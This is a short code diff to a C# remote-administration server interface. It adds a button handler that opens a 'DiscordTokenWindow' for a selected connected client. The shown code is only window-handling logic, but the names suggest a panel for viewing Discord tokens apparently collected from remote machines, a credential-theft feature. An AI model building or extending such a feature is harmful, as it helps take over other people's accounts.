@@ -726,6 +726,27 @@ namespace RemoteAdmin.Server
             }
         }
 
+        private void OpenDiscordTokenWindow_Click(object sender, RoutedEventArgs e)
+        {
+            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
+            if (selectedClient == null)
+            {
+                MessageBox.Show("Please select a client first.", "No Client Selected",
+                    MessageBoxButton.OK, MessageBoxImage.Warning);
+                return;
+            }
+           
+            if (selectedClient.DiscordTokenWindow != null)
+            {
+                selectedClient.DiscordTokenWindow.Activate();
+                return;
+            }
+
+            var tokenWindow = new DiscordTokenWindow(selectedClient);
+            tokenWindow.Show();
+        }
+
+
 
         private void TabControl_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
         {
